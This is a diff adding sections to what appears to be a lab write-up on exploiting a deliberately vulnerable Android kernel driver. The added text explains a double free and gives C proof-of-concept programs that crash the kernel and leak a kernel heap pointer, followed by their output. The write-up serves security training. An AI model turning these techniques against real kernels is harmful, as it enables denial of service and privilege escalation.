@@ -396,7 +396,27 @@ if (req.msg_id > MAX || req.buf_id > MAX) {
 }
 ```
 
-The function doesn't return after detecting invalid IDs, making the check useless.
+#### 4. Double Free Vulnerability
+
+The combination of the UAF in `DELETE_MSG` creates a **double free** vulnerability. Since `msgs[msg_id]` is never set to NULL after freeing, we can call `DELETE_MSG` twice on the same message ID, causing the kernel to free the same memory twice.
+```c
+case DELETE_MSG:
+    if (!msgs[msg_id]){           // This check passes because pointer is not NULL!
+        printk(KERN_INFO "Msg with msg_id doesn't exist");
+        return 0;
+    }
+    obj = msgs[msg_id];            // Gets dangling pointer
+    kfree(obj);                    // Frees already-freed memory!
+    // msgs[msg_id] STILL not cleared!
+```
+
+**Why This Happens:**
+
+1. First `DELETE_MSG`: Frees the memory but leaves `msgs[msg_id]` pointing to it
+2. Second `DELETE_MSG`: The check `if (!msgs[msg_id])` passes because the pointer is not NULL
+3. `kfree()` is called on already-freed memory
+4. Kernel heap allocator metadata gets corrupted
+5. System crashes or becomes unstable
 
 ## Exploitation Strategy
 
@@ -610,5 +630,248 @@ uid: 1000
 uid: 0
 $ whoami
 root
+$ 
+```
+
+### Double Free Vulnerability
+
+Since `msgs[msg_id]` contains a dangling pointer after `DELETE_MSG`, we can trigger a **double free** by calling `DELETE_MSG` twice on the same message ID. While not directly exploitable for privilege escalation in this scenario, it causes a **Denial of Service (DoS)** and crashes the driver.
+
+**How it happens:**
+```c
+case DELETE_MSG:
+    if (!msgs[msg_id]){
+        printk(KERN_INFO "Msg with msg_id doesn't exist");
+        return 0;
+    }
+    obj = msgs[msg_id];
+    kfree(obj);              // First free
+    // BUG: msgs[msg_id] is NOT set to NULL!
+```
+
+Since `msgs[msg_id]` is never cleared, calling `DELETE_MSG` again will:
+1. Pass the null check (because `msgs[msg_id]` still points to freed memory)
+2. Call `kfree()` on already-freed memory
+3. Corrupt the kernel heap allocator's metadata
+4. Crash the system
+
+**Visualizing the Double Free:**
+```
+Step 1: CREATE_MSG (id=69)
+┌────────────────────────────────────┐
+│ msgs[69] ──► [Message Object]      │
+│              Valid allocation      │
+└────────────────────────────────────┘
+
+Step 2: First DELETE_MSG (id=69)
+┌────────────────────────────────────┐
+│ msgs[69] ──► [FREED MEMORY]        │
+│              Memory returned to    │
+│              kernel allocator      │
+│              BUT pointer remains!  │
+└────────────────────────────────────┘
+
+Step 3: Second DELETE_MSG (id=69) 
+┌────────────────────────────────────┐
+│ msgs[69] ──► [ALREADY FREED!]      │
+│              Freeing freed memory  │
+│              = DOUBLE FREE!        │
+│              Corrupts allocator    │
+│              System CRASH!         │
+└────────────────────────────────────┘
+```
+
+**Proof of Concept - Double Free:**
+
+```c
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+
+#define CREATE_MSG _IO(1, 0)
+#define DELETE_MSG _IO(1, 4)
+
+struct user_req {
+    unsigned int buf_id;
+    unsigned int msg_id;
+    char buffer[128];
+};
+
+int main() {
+    char *driver = "/proc/tryout";
+    int fd = open(driver, O_RDWR);
+    struct user_req *request = malloc(sizeof(struct user_req));
+
+    memset(request, 0, sizeof(struct user_req));
+    request->msg_id = 69;
+    request->buf_id = 69;
+
+    printf("[*] Creating message with ID 69...\n");
+    ioctl(fd, CREATE_MSG, request);
+    
+    printf("[*] Deleting message (first time)...\n");
+    ioctl(fd, DELETE_MSG, request); 
+    
+    printf("[!] Triggering double free...\n");
+    ioctl(fd, DELETE_MSG, request); 
+    
+    close(fd);
+    return 0;
+}
+```
+compile the `crash.c` and move it into android and run it.
+
+```bash
+$ ./crash 
+[*] Creating message with ID 69...
+[   35.978551] New message created
+[*] Deleting message (first time)...
+[   35.978652] 
+[!] Triggering double free...
+[   35.980684] 
+```
+we can trigger it by trying to move something to android using scp.
+
+```bash
+[  263.265849] Unable to handle kernel paging request at virtual address 004c000000000a08
+[  263.266779] Mem abort info:
+[  263.267028]   ESR = 0x96000004
+[  263.267318]   EC = 0x25: DABT (current EL), IL = 32 bits
+[  263.267719]   SET = 0, FnV = 0
+[  263.268012]   EA = 0, S1PTW = 0
+[  263.268310] Data abort info:
+[  263.268595]   ISV = 0, ISS = 0x00000004
+[  263.268882]   CM = 0, WnR = 0
+[  263.269067] [004c000000000a08] address between user and kernel address ranges
+[  263.269388] Internal error: Oops: 96000004 [#1] PREEMPT SMP
+[  263.269762] Modules linked in: tryoutlab(PO)
+[  263.270920] CPU: 0 PID: 189 Comm: sshd Tainted: P           O      5.10.107-g62f70baf15f0-dirty #1
+[  263.271367] Hardware name: linux,dummy-virt (DT)
+[  263.271881] pstate: 60000085 (nZCv daIf -PAN -UAO -TCO BTYPE=--)
+[  263.272384] pc : update_load_avg+0x2c/0x454
+[  263.272747] lr : attach_entity_cfs_rq+0x40/0x21c
+[  263.273003] sp : ffff80001209bc40
+[  263.273235] x29: ffff80001209bc40 x28: ffff000002619200 
+[  263.273676] x27: 0000000000000000 x26: 0000000000000000 
+[  263.273964] x25: 0000000000000000 x24: 0000000000000000 
+[  263.274182] x23: ffff000000000002 x22: ffff000002c86d80 
+[  263.274403] x21: 0000000000000000 x20: ffff0000026192c0 
+[  263.274611] x19: ffff000000000002 x18: ffff0000026192c0 
+[  263.274799] x17: 0000000000000000 x16: 0000000000000000 
+[  263.274950] x15: 0000000000000003 x14: 000000000191ece6 
+[  263.275104] x13: 0000000001b708e6 x12: ffff800011b22000 
+[  263.275267] x11: 000000000000ba73 x10: ffff800010e6a8d0 
+[  263.275680] x9 : 0000000002e7374e x8 : 000000000000036c 
+[  263.275946] x7 : 0000003d2b0db000 x6 : 0000000000000000 
+[  263.276090] x5 : 0000000000000000 x4 : 0000000000000000 
+[  263.276276] x3 : 0000000000000000 x2 : 0000000000000000 
+[  263.276520] x1 : 0000000000000000 x0 : 1b4c000000000000 
+[  263.276902] Call trace:
+[  263.277145]  update_load_avg+0x2c/0x454
+[  263.277261]  attach_entity_cfs_rq+0x40/0x21c
+[  263.277363]  task_change_group_fair+0xcc/0x1f0
+[  263.277465]  sched_change_group+0x4c/0xd4
+[  263.277556]  sched_move_task+0x16c/0x194
+[  263.277650]  autogroup_move_group+0x88/0x174
+[  263.277763]  sched_autogroup_create_attach+0xc4/0x214
+[  263.277888]  ksys_setsid+0xcc/0x100
+[  263.277974]  __arm64_sys_setsid+0x10/0x20
+[  263.278071]  el0_svc_common.constprop.0+0x74/0x1b4
+[  263.278176]  do_el0_svc+0x28/0x9c
+[  263.278269]  el0_svc+0x14/0x20
+[  263.278348]  el0_sync_handler+0xa4/0x130
+[  263.278440]  el0_sync+0x1a0/0x1c0
+[  263.278791] Code: 2a0203f5 a90363f7 f9409800 f9406021 (f9450416) 
+[  263.279150] ---[ end trace e20a9a97a88ab088 ]---
+[  263.279349] note: sshd[189] exited with preempt_count 3
+```
+
+Now we can use double free exploit to leak values
+
+```c
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+
+#define CREATE_MSG _IO(1, 0)
+#define CREATE_BUF _IO(1, 1)
+#define READ_MSG _IO(1, 2)
+#define DELETE_MSG _IO(1, 4)
+
+struct user_req {
+    unsigned int buf_id;
+    unsigned int msg_id;
+    char buffer[128];
+};
+
+int main() {
+    char *driver = "/proc/tryout";
+    int fd = open(driver, O_RDWR);
+    struct user_req *request = malloc(sizeof(struct user_req));
+
+    // Fill with recognizable pattern
+    memset(request, 0x41, sizeof(struct user_req));
+    request->msg_id = 69;
+    request->buf_id = 69;
+
+    printf("[*] Creating message with ID 69...\n");
+    ioctl(fd, CREATE_MSG, request);
+    
+    printf("[*] Deleting message (UAF trigger)...\n");
+    ioctl(fd, DELETE_MSG, request);
+    
+    printf("[*] Creating buffer (reuses freed message slot)...\n");
+    ioctl(fd, CREATE_BUF, request);
+
+    // Clear and read back
+    memset(request, 0x0, sizeof(struct user_req));
+    request->msg_id = 69;
+    request->buf_id = 69;
+    
+    printf("[*] Reading message to leak heap pointer...\n");
+    ioctl(fd, READ_MSG, request);
+
+    printf("[+] Leaked kernel heap pointer: ");
+    
+    // The buffer pointer is at offset 16 in the msg structure
+    // In little-endian, we read it backwards
+    for(int i = 23; i > 15; i--){
+        printf("%02x", (unsigned char)request->buffer[i]);
+    }
+    
+    printf("\n");
+    
+    // Alternative: Extract as uint64_t
+    uint64_t leaked_ptr = 0;
+    memcpy(&leaked_ptr, &request->buffer[16], 8);
+    printf("[+] Leaked pointer (as number): 0x%016lx\n", leaked_ptr);
+
+    close(fd);
+    return 0;
+}
+```
+we leak kernel heap pointer 
+
+```bash
+$ ./leak 
+[*] Creating message with ID 69...
+[   31.024852] New message created
+[*] Deleting message (UAF trigger)...
+[   31.024889] 
+[*] Creating buffer (reuses freed message slot)...
+[   31.025390] 
+[   31.025732] Buffer created and linked to msg
+[*] Reading message to leak heap pointer...
+[   31.025800] 
+[   31.026175] Msg buffer read
+[+] Leaked kernel heap pointer: ffff000003499f00
+[+] Leaked pointer (as number): 0xffff000003499f00
 $ 
 ```
